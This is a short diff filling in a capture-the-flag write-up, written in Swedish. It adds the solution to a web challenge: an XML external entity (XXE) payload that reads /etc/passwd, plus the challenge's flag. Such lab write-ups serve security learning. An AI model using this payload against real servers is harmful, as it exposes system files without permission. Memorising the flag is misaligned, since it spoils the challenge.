@@ -7,10 +7,13 @@
 [http://challs.crate.nu:16627](http://challs.crate.nu:16627)
 
 ## Solution
-1. <++>
-2. `<++>`
-3. `./solve.sh`
+1. Kolla hacktricks.xyz, de har ett tips på en xml-payload för att läsa `/etc/passwd`, testar denna
+2. ```xml
+<!--?xml version="1.0" ?-->
+<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
+<data>&example;</data>``
+3. Få flagga...
 
 
 ## Flag
-**Flag:** `<++>`
+**Flag:** `cratectf{xml_xxe_xploit_xpert}`
